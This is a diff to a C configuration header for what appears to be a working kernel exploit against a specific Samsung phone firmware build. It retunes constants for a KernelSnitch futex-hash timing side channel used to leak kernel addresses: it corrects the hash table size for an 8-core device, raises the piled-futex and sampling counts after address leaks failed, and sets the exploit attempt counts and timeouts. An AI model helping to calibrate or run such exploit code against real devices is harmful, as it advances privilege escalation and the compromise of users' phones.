@@ -22,7 +22,16 @@
 #define MM_ORDER 3
 #define KERNELSNITCH_MTE_ENABLED 1
 #define KERNELSNITCH_VERBOSE 1
-#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
+/*
+ * Image-derived: futex_init() computes
+ * roundup_pow_of_two(num_possible_cpus() * 256); the S9210ZHS6DZF2 DTB has 8
+ * cpu nodes (verified in vendor_boot.img), so the real futex hash table is
+ * 0x800 buckets.  The e1q app build runs the non-FRESH KernelSnitch path
+ * (futex_hashsize = online_cpus * 256 = 0x800), which matches; this define
+ * only matters if APP_REQUIRE_FRESH_P0_SESSION is ever enabled, and must stay
+ * 0x800 (the S24-family 0x1000 value is wrong for this 8-core kernel).
+ */
+#define KERNELSNITCH_FUTEX_HASH_SIZE 0x800
 #define KSNITCH_COLLISIONS 5
 #define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #define APP_SLIDE_RECLAIM_SENDS 192
@@ -77,8 +86,17 @@
 #define DEFAULT_EXPLOIT_ATTEMPTS 1
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
-#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+/*
+ * KernelSnitch timing profile restored to the reference-proven values.  The
+ * S24-family fast profile (2048/64/8) yields "pipe KernelSnitch sk_buff page
+ * leak failed" on this device: the piled-bucket signal is too weak, so the
+ * collision scan latches timing-noise addresses that fail the exact
+ * futex-hash equality in the mm_struct bruteforce.  4096 piled futexes make a
+ * real collision ~2x slower, and 128 samples with avg=8 give a cleaner
+ * baseline, restoring the discrimination the bruteforce depends on.
+ */
+#define SLIDE_KSNITCH_APPENDED_FUTEXES 4096
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 128
 #define SLIDE_KSNITCH_AVERAGE 8
 #define SLIDE_BANK_SLOTS 4
 #define SLIDE_BANK_TASK_OFF 0x3200
